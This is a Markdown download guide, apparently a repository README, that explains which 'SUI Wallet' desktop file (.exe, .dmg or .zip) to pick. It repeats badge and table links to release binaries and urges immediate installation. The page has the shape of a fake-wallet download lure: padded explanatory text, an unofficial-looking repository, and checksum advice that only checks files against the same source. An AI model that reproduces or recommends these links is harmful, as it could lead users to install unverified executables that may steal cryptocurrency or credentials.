![SUI Wallet](assets/banner-article.png)

# Which SUI Wallet file do I download?

Three filenames, one build: how to read .exe, .dmg and .zip before downloading.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Match the file to the machine: the `.exe` for 64-bit Windows 10 build 1909 or later, the `.dmg` for macOS 12
or later, the `.zip` for x64 Linux on Ubuntu 20.04 or equivalent. One machine needs one file. If two of them
look plausible, the operating system decides, not the file size.

## Reading the three extensions

The extension is the answer in most cases, and it is worth learning the three because the same pattern appears on every release: the installer for Windows, the disk image for macOS, the archive for Linux. None of them is a fuller version of another.

- **`.exe`** - Windows. An installer that places the application and creates a shortcut.
- **`.dmg`** - macOS. A disk image you open, drag from, and eject.
- **`.zip`** - Linux. An archive you unpack and run from wherever it sits.

None of them is a "full" version of another. They are the same release packaged for three systems.

The three are not interchangeable in either direction: an archive is not a portable installer, and a disk image is not an archive with different branding. Reading the extension is the fastest filter available, and it is correct in every case where one machine is involved.

## When the machine has two operating systems

A dual-boot machine is two machines as far as this decision goes. Booted into Windows, take the installer; booted into Linux, take the archive. The file you downloaded while in the other system will not run here, and the shared download folder does not change that.

A virtual machine follows the guest rather than the host, so a Windows guest takes the Windows installer
whatever the host is running.

On a dual-boot machine the Downloads folder is shared between both systems, which is how the wrong file ends up looking present and available. The folder does not decide anything; the system you are booted into does.

## Why the sizes differ

The three files are built differently, so their sizes are not directly comparable. An installer carries setup machinery; an archive carries unpacked files and compresses them. A large difference between the Windows and Linux files says nothing at all about missing features.

Compare sizes only against the same platform's file in an older release, and only to spot a truncated
download rather than to judge the build.

A truncated download is the failure this comparison actually catches. A file far smaller than its platform's usual build is an interrupted transfer rather than a compact edition, and running it produces an error that no panel explains.

## The mistakes worth avoiding

Three account for almost every wrong download. Taking a file from a search result rather than the release
page. Taking the file for a different operating system because the page was read quickly. And taking a file
that a message or a video offered directly, which is the shape a fake download arrives in.

[SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) covers the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) and the digest check. The rule that matters
here is narrower: the file has to come from the release, and it has to match the machine.

## If you already unpacked the wrong one

An installer on a Mac and a disk image on Windows do nothing, so the mistake is visible immediately. A Linux
archive on a Windows machine cannot run at all. Delete the wrong file and take the right one - nothing has
been installed, and the account is not involved.

That is worth saying plainly because the failure looks alarming and is entirely reversible. The one case
that is not reversible is a file from outside the release, which should be deleted before it runs.

Nothing on the machine needs cleaning up afterwards, because nothing was installed: an unpacked archive is a folder, and a disk image that would not open is a file. Deleting the folder or the file returns the machine to where it started, with the account untouched.

## Checking the file before it runs

Each asset has a SHA-256 value published beside it. Windows produces the value with Get-FileHash, macOS with shasum, Linux with sha256sum, and the strings either match exactly or they do not, because a near miss is a different file. Two values, no interpretation.

[SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md) answers the other half of the question - whether the machine
meets the requirement for the file you picked. [How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) takes the
Windows route from file to first window, and the Linux archive has its own guide.

The comparison is the same shape on all three platforms: one command that prints a 64-character value, read against the published one. It costs a minute, and it is the only step that distinguishes the project's file from a copy that carries its name.

## FAQ

### Which SUI Wallet download do I pick for my operating system?

The file with the extension your system uses: `.exe` on Windows, `.dmg` on macOS, `.zip` on Linux. The
release page lists all three, and the machine decides.

### Is there a portable Windows version?

No. Windows gets an installer; the archive is the Linux build's format rather than a portable option for
other systems.

### Can I install the macOS file on Windows?

No. The disk image is a macOS package and does nothing on Windows, which is why the mistake is obvious
immediately.

### Which file works on a Chromebook?

Only the Linux archive, and only if the Chromebook's Linux environment meets the x64 line. Most do not, so
this is worth checking before downloading.

### Does the file matter if I only want to receive SUI?

You still need one file installed to have an address at all. The file choice is about the machine, not
about what you intend to do with the wallet.
